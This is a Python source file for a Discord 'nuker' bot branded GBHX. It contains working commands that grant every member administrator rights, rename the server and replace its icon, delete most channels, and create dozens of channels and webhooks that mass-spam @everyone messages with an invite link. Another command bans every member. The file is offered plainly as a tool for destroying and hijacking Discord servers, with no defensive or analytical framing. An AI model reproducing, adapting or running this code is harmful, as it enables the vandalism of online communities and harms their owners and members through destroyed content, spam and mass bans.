from discord import Permissions
import discord, random, time
import json
from discord.ext import commands, tasks
from discord import Interaction
import os
import colorama
import asyncio
from colorama import Fore
from discord import Embed
from flask import Flask
from threading import Thread
from discord import app_commands
import subprocess


app = Flask(__name__)


ALLOWED_USER_ID = 1344966239667224604


@app.route("/")
def home():
    return "Bot is running!"


def run():
    app.run(host="0.0.0.0", port=5000)


Thread(target=run).start()

colorama.init()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command("help")
with open('config.json') as f:
    data = json.load(f)
    token = data["TOKEN"]


@bot.event
async def on_ready():
    print(f"{Fore.LIGHTCYAN_EX}NUKER is online")



@bot.command(pass_context=True)
async def admin(ctx):
    await ctx.message.delete()
    for i in range(10):
        try:
            guild = ctx.guild
            role = await guild.create_role(name="GBHX NUKER",
                                           permissions=discord.Permissions(8),
                                           colour=discord.Colour(000000))
            for user in ctx.guild.members:
                await user.add_roles(role)
                print("Gave you admin ")
        except:
            print("Couldnt give you admin")


@bot.command()
async def nuke(ctx, amount=30, name_of_channel="NUKED-BY-GBHX"):
    await ctx.guild.edit(name="NUKED BY GBHX")

    path_to_image = "logo(1).png"
    with open(path_to_image, "rb") as file:
        icon: bytes = file.read()
        await ctx.guild.edit(icon=icon)

    await ctx.message.delete()

    for channel in ctx.guild.channels:
        if channel.type != discord.ChannelType.news and channel not in [
            ctx.guild.rules_channel,
            ctx.guild.system_channel,
        ]:
            try:
                await channel.delete()
            except discord.HTTPException as e:
                if e.code == 50074: 
                    print(f"Skipping required channel: {channel.name}")
                else:
                    raise


    new_channels = await asyncio.gather(
        *[ctx.guild.create_text_channel(name_of_channel) for _ in range(amount)]
    )


    webhook_tasks = [channel.create_webhook(name="Spammer") for channel in new_channels]
    webhooks = await asyncio.gather(*webhook_tasks)


    send_tasks = [
        channel.send(f"Nuked! @everyone GBHX OWNS YOU https://discord.gg/yFBKywTE")
        for channel in new_channels
        for _ in range(30)  
    ] + [
        webhook.send(f"Nuked! @everyone GBHX OWNS YOU https://discord.gg/yFBKywTE")
        for webhook in webhooks
        for _ in range(30)  
    ]

    await asyncio.gather(*send_tasks)  


@bot.command()
async def banAll(ctx):
    if ctx.author.id == ALLOWED_USER_ID:
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.ban(reason="Nuked by GBHX")
                print(f"Banned {user}")
            except discord.Forbidden:
                print(f"Failed to ban {user}: Missing permissions")
            except discord.HTTPException as e:
                print(f"Failed to ban {user}: {e}")


bot.run(token)
